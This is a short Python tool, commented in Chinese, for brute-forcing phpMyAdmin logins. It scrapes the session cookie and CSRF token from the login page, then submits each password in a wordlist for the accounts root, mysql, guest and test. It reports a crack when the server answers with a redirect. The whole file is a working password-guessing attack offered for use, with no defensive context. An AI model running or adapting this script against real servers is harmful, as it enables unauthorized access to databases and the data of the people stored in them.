#!/usr/bin/env python
# -*- coding:utf-8 -*-
#@Time:2020/9/17 0:19
import requests
import re
import html
import argparse
from requests.packages import urllib3

flag = 0
urllib3.disable_warnings()
userList = ['root','mysql','guest','test']
def getpassword(user, password):
    session = requests.session()
    res = session.get(Target,verify=False)
    cookieName = 'phpMyAdmin_https' # ! 注意查看返回包cookie是否有多个phpMyAdmin
    cookieMatch = re.findall(f'{cookieName}=(.*?);', res.headers['Set-Cookie'])
    if (len(cookieMatch) == 0):
        raise Exception("未找到 setCookie中的 phpMyAdmin_https,请查看网页源代码修改 cookieName 变量",res.headers['Set-Cookie'])
    tmp_session = cookieMatch[0]
    # print(res.text)
    # 修正token正则,兼容不同HTML结构,原正则假设<input>后紧跟<input>,但实际HTML结构可能不同,需更通用匹配
    tokenMatch = re.findall(r'<input[^>]*name="token"[^>]*value="(.*?)"', res.text)
    if (len(tokenMatch) == 0):
        raise Exception("未找到token表单的值,请查看网页源代码修改 tokenMatch 变量",res.text)
    # print(tokenMatch)
    tmp_token = html.unescape(tokenMatch[0])#不同版本正则有所区别
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    post_data={"set_session":tmp_session,"pma_username":user,"pma_password":password,"server":"1","target":"index.php","token":tmp_token}
    res2 = session.post(url=Target,data=post_data,headers=headers,allow_redirects=False,verify=False)
    #print(res2.text)
    if res2.status_code == 302:
        print("Find PASSWORD!!!!!!:"+user+":"+password)
        flag = 1
        exit()
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', default="http://192.168.1.1/")
    parser.add_argument('-p', '--password', default="password.txt")
    args = parser.parse_args()
    Target = args.url
    PasswordList = args.password
    for user in userList:
        print("开始破解 " + user + "密码")
        for line in open(PasswordList, 'r',encoding='utf-8'):
            password = line.strip()
            print("=>"+user+":"+password)
            getpassword(user, password)
    if flag:
        print("破解结束")
    else:
        print("破解结束:未成功破解")
